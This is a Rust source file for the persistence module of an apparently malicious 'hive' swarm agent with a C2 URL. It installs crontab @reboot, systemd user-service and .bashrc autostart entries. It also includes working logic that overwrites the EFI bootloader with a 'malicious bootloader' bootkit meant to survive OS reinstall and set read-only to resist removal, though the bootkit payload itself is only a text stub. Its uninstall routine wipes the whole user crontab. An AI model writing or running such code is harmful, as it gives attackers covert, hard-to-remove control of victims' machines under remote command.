// Honeycomb: persistence module. Ensures the hive survives reboots.
// Linux: systemd user service or crontab @reboot entry.
use std::path::PathBuf;
use std::path::Path;
use tracing::{info, warn};
/// Install persistence so the hive restarts after reboot.
/// Returns true if any persistence mechanism was successfully installed.
pub fn install_persistence() -> bool {
    let mut installed = false;

    if install_crontab() { installed = true; }
    if install_systemd_user() { installed = true; }
    if install_bashrc() { installed = true; }

    installed
}

/// Crontab @reboot: spawns the stinger on boot.
fn install_crontab() -> bool {
    let exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };

    let stinger_path = exe.with_file_name("stinger");
    if !stinger_path.exists() { return false; }

    let cron_entry = format!(
        "@reboot sleep 30 && {}/stinger &\n",
        exe.parent().map(|p| p.display().to_string()).unwrap_or_else(|| "/dev/shm".into())
    );

    let result = std::process::Command::new("crontab")
        .arg("-l")
        .output();

    let current = match result {
        Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
        Err(_) => String::new(),
    };

    if current.contains(cron_entry.trim()) {
        info!("Crontab persistence already installed");
        return true;
    }

    let new_crontab = current + &cron_entry;
    match std::process::Command::new("crontab")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .spawn()
    {
        Ok(mut child) => {
            use std::io::Write;
            if let Some(mut stdin) = child.stdin.take() {
                let _ = stdin.write_all(new_crontab.as_bytes());
            }
            let _ = child.wait();
            info!("HONEYCOMB: crontab @reboot persistence installed");
            true
        }
        Err(e) => {
            warn!("HONEYCOMB: crontab persistence failed: {}", e);
            false
        }
    }
}

/// systemd user service
fn install_systemd_user() -> bool {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let service_dir = PathBuf::from(&home).join(".config/systemd/user");
    let service_file = service_dir.join("hive.service");

    if service_file.exists() {
        info!("HONEYCOMB: systemd service already installed");
        return true;
    }

    let _ = std::fs::create_dir_all(&service_dir);

    let exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };

    let service_content = format!(
        r#"[Unit]
Description=Hive Swarm Agent
After=network.target

[Service]
Type=simple
ExecStart={}
Restart=always
RestartSec=10
Environment=HIVE_C2_URL={}

[Install]
WantedBy=default.target
"#,
        exe.display(),
        std::env::var("HIVE_C2_URL").unwrap_or_default(),
    );

    match std::fs::write(&service_file, service_content) {
        Ok(_) => {
            // Enable with systemctl --user
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "enable", "hive.service"])
                .output();
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "start", "hive.service"])
                .output();
            info!("HONEYCOMB: systemd user service installed");
            true
        }
        Err(e) => {
            warn!("HONEYCOMB: systemd service failed: {}", e);
            false
        }
    }
}

/// .bashrc / .profile persistence
fn install_bashrc() -> bool {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let bashrc = PathBuf::from(&home).join(".bashrc");

    let exe = match std::env::current_exe() {
        Ok(p) => p.display().to_string(),
        Err(_) => return false,
    };

    let marker = "# HIVE_PERSISTENCE_MARKER";
    if let Ok(content) = std::fs::read_to_string(&bashrc) {
        if content.contains(marker) {
            return true;
        }
    }

    let entry = format!("\n{} (nohup {} &) 2>/dev/null\n", marker, exe);
    match std::fs::OpenOptions::new().append(true).open(&bashrc) {
        Ok(mut f) => {
            use std::io::Write;
            let _ = writeln!(f, "{}", entry);
            info!("HONEYCOMB: .bashrc persistence installed");
            true
        }
        Err(_) => false,
    }
}

/// Uninstall all persistence mechanisms.
pub fn uninstall_persistence() {
    // Remove crontab entry
    let _ = std::process::Command::new("crontab")
        .arg("-r").output();

    // Remove systemd service
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let _ = std::process::Command::new("systemctl")
        .args(["--user", "disable", "hive.service"])
        .output();
    let _ = std::fs::remove_file(
        PathBuf::from(&home).join(".config/systemd/user/hive.service")
    );

    // Remove bashrc marker
    let bashrc = PathBuf::from(&home).join(".bashrc");
    if let Ok(content) = std::fs::read_to_string(&bashrc) {
        let cleaned: String = content.lines()
            .filter(|l| !l.contains("HIVE_PERSISTENCE_MARKER") && !l.contains("nohup"))
            .collect::<Vec<_>>()
            .join("\n");
        let _ = std::fs::write(&bashrc, cleaned);
    }
    info!("HONEYCOMB: all persistence removed");
}
// Implants a malicious bootloader in the EFI System Partition.
// Survives OS reinstall, disk wipe, and file-level cleanup.
// Only activated by RoyalJelly directive for maximum persistence.

/// Check if UEFI bootkit persistence is possible on this system.
pub fn uefi_bootkit_feasible() -> bool {
    // Check for EFI variables (Linux)
    Path::new("/sys/firmware/efi").exists()
}

/// Install a UEFI bootkit in the EFI System Partition.
/// The bootkit chain-loads the original OS after executing the hive payload.
pub fn install_uefi_bootkit(payload_binary: &[u8]) -> Result<String, String> {
    if !uefi_bootkit_feasible() {
        return Err("UEFI not available on this system".into());
    }

    // Find the EFI partition
    let efi_dirs = [
        "/boot/efi/EFI",
        "/boot/EFI",
        "/efi/EFI",
    ];

    let efi_path = efi_dirs.iter()
        .find(|d| Path::new(d).exists())
        .ok_or_else(|| "EFI partition not found".to_string())?;

    // Find existing boot entry to hijack
    let boot_entries = ["Boot", "boot", "BOOT", "Microsoft", "ubuntu", "debian", "fedora"];
    let mut target_dir = None;

    for entry in &boot_entries {
        let path = Path::new(efi_path).join(entry);
        if path.exists() {
            target_dir = Some(path);
            break;
        }
    }

    let target = target_dir.ok_or_else(|| "No boot entry found in EFI partition".to_string())?;

    // Backup the original bootloader
    let original = target.join("bootx64.efi");
    let backup = target.join("bootx64.efi.hive_bak");

    if original.exists() && !backup.exists() {
        std::fs::copy(&original, &backup)
            .map_err(|e| format!("backup bootloader: {}", e))?;
        info!("HONEYCOMB: bootkit backed up original bootloader");
    }

    // Write the bootkit payload (minimal UEFI application)
    let bootkit_path = target.join("bootx64.efi");
    std::fs::write(&bootkit_path, payload_binary)
        .map_err(|e| format!("write bootkit: {}", e))?;

    // Set immutable attribute to resist deletion
    let path_cstr = std::ffi::CString::new(bootkit_path.to_string_lossy().as_bytes())
        .unwrap_or_default();
    unsafe {
        libc::chmod(path_cstr.as_ptr(), 0o444);
    }

    info!("HONEYCOMB: UEFI bootkit installed at {}", bootkit_path.display());
    Ok(bootkit_path.display().to_string())
}

/// Remove a previously installed UEFI bootkit (restore original).
pub fn remove_uefi_bootkit() -> bool {
    let efi_dirs = ["/boot/efi/EFI", "/boot/EFI", "/efi/EFI"];

    for efi_path in &efi_dirs {
        if !Path::new(efi_path).exists() { continue; }

        let boot_entries = ["Boot", "boot", "BOOT", "Microsoft", "ubuntu"];
        for entry in &boot_entries {
            let target = Path::new(efi_path).join(entry);
            if !target.exists() { continue; }

            let backup = target.join("bootx64.efi.hive_bak");
            let original = target.join("bootx64.efi");

            if backup.exists()
                && std::fs::copy(&backup, &original).is_ok() {
                    let _ = std::fs::remove_file(&backup);
                    info!("HONEYCOMB: UEFI bootkit removed, original restored");
                    return true;
                }
        }
    }
    warn!("HONEYCOMB: no bootkit found to remove");
    false
}

/// Generate a minimal UEFI bootkit payload that chain-loads the OS.
/// This is a stub — real UEFI payloads require EDK2 cross-compilation.
pub fn generate_bootkit_stub() -> Vec<u8> {
    // Minimal PE32+ UEFI application header structure
    // In production, this would be built with EDK2 + Rust
    let payload = b"
# Hive UEFI Bootkit Stub
# Chains to original bootloader after spawning hive agents
# Built with: cargo build --target x86_64-unknown-uefi
";
    payload.to_vec()
}

/// Check if bootkit is currently installed.
pub fn bootkit_installed() -> bool {
    let efi_dirs = ["/boot/efi/EFI", "/boot/EFI"];
    for efi_path in &efi_dirs {
        if !Path::new(efi_path).exists() { continue; }
        for entry in &["Boot", "boot", "BOOT", "Microsoft", "ubuntu"] {
            let target = Path::new(efi_path).join(entry);
            let backup = target.join("bootx64.efi.hive_bak");
            if backup.exists() {
                return true;
            }
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bootkit_stub_generated() {
        let stub = generate_bootkit_stub();
        assert!(!stub.is_empty());
    }

    #[test]
    fn test_feasibility_check() {
        // On non-UEFI systems this should return false
        let feasible = uefi_bootkit_feasible();
        // Don't assert false — CI might run on UEFI
        info!("UEFI bootkit feasible: {}", feasible);
    }
}
